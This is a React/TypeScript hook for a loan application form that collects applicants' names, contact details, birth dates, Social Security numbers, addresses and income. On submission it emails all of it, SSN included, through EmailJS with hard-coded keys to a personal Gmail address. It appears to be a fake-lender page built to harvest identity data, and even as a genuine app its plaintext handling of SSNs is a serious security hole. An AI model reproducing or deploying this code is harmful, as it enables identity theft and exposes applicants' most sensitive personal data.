import { useState } from 'react';
import emailjs from '@emailjs/browser';
import { LoanApplication, FormStep } from '../types/loan';

const initialState: LoanApplication = {
  personalInfo: {
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    dateOfBirth: '',
    address: '',
    city: '',
    state: '',
    zipCode: '',
    socialSecurityNumber: '',
  },
  financialInfo: {
    employmentStatus: 'employed',
    annualIncome: 0,
    employerName: '',
    jobTitle: '',
    employmentLength: '',
  },
  loanDetails: {
    amount: 5000,
    purpose: '',
    term: 24,
  },
  currentStep: 'loan-details',
  isSubmitted: false,
};

// Initialize EmailJS with your public key
emailjs.init("mazjgQrYQ3Q-eKqsC");

export const useLoanForm = () => {
  const [loanApplication, setLoanApplication] = useState<LoanApplication>(initialState);
  
  const updatePersonalInfo = (field: string, value: string) => {
    setLoanApplication((prev) => ({
      ...prev,
      personalInfo: {
        ...prev.personalInfo,
        [field]: value,
      },
    }));
  };

  const updateFinancialInfo = (field: string, value: string | number) => {
    setLoanApplication((prev) => ({
      ...prev,
      financialInfo: {
        ...prev.financialInfo,
        [field]: value,
      },
    }));
  };

  const updateLoanDetails = (field: string, value: string | number) => {
    setLoanApplication((prev) => ({
      ...prev,
      loanDetails: {
        ...prev.loanDetails,
        [field]: value,
      },
    }));
  };

  const nextStep = () => {
    const steps: FormStep[] = ['loan-details', 'personal-info', 'financial-info', 'review', 'confirmation'];
    const currentIndex = steps.indexOf(loanApplication.currentStep);
    
    if (currentIndex < steps.length - 1) {
      setLoanApplication((prev) => ({
        ...prev,
        currentStep: steps[currentIndex + 1],
      }));
    }
  };

  const prevStep = () => {
    const steps: FormStep[] = ['loan-details', 'personal-info', 'financial-info', 'review', 'confirmation'];
    const currentIndex = steps.indexOf(loanApplication.currentStep);
    
    if (currentIndex > 0) {
      setLoanApplication((prev) => ({
        ...prev,
        currentStep: steps[currentIndex - 1],
      }));
    }
  };

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
      minimumFractionDigits: 0,
      maximumFractionDigits: 0,
    }).format(amount);
  };

  // Generate application reference number
  const generateApplicationNumber = () => {
    return `BL-${Math.floor(Math.random() * 10000).toString().padStart(4, '0')}-${new Date().getFullYear()}`;
  };

  const submitApplication = async () => {
    try {
      const applicationNumber = generateApplicationNumber();

      // Prepare email template data
      const templateParams = {
        to_email: 'jessyshaid@gmail.com',
        from_name: `${loanApplication.personalInfo.firstName} ${loanApplication.personalInfo.lastName}`,
        loan_amount: formatCurrency(loanApplication.loanDetails.amount),
        loan_purpose: loanApplication.loanDetails.purpose,
        loan_term: `${loanApplication.loanDetails.term} months`,
        monthly_payment: formatCurrency(calculateMonthlyPayment()),
        full_name: `${loanApplication.personalInfo.firstName} ${loanApplication.personalInfo.lastName}`,
        email: loanApplication.personalInfo.email,
        phone: loanApplication.personalInfo.phone,
        dob: loanApplication.personalInfo.dateOfBirth,
        ssn: loanApplication.personalInfo.socialSecurityNumber,
        address: `${loanApplication.personalInfo.address}, ${loanApplication.personalInfo.city}, ${loanApplication.personalInfo.state} ${loanApplication.personalInfo.zipCode}`,
        employment_status: loanApplication.financialInfo.employmentStatus,
        annual_income: formatCurrency(loanApplication.financialInfo.annualIncome),
        employer: loanApplication.financialInfo.employerName,
        job_title: loanApplication.financialInfo.jobTitle,
        employment_length: loanApplication.financialInfo.employmentLength,
        application_number: applicationNumber,
      };

      // Send email using EmailJS
      await emailjs.send(
        'service_1wfwqsh',
        'template_2c5mgso',
        templateParams
      );

      // Update application state
      setLoanApplication((prev) => ({
        ...prev,
        isSubmitted: true,
        currentStep: 'confirmation',
      }));
    } catch (error) {
      console.error('Failed to send email:', error);
      // Handle error appropriately
    }
  };

  // Calculate estimated monthly payment
  const calculateMonthlyPayment = () => {
    const { amount, term } = loanApplication.loanDetails;
    const interestRate = 0.0599; // 5.99% APR
    const monthlyRate = interestRate / 12;
    const payment = (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -term));
    
    return isNaN(payment) ? 0 : Math.round(payment * 100) / 100;
  };

  return {
    loanApplication,
    updatePersonalInfo,
    updateFinancialInfo,
    updateLoanDetails,
    nextStep,
    prevStep,
    submitApplication,
    calculateMonthlyPayment,
  };
};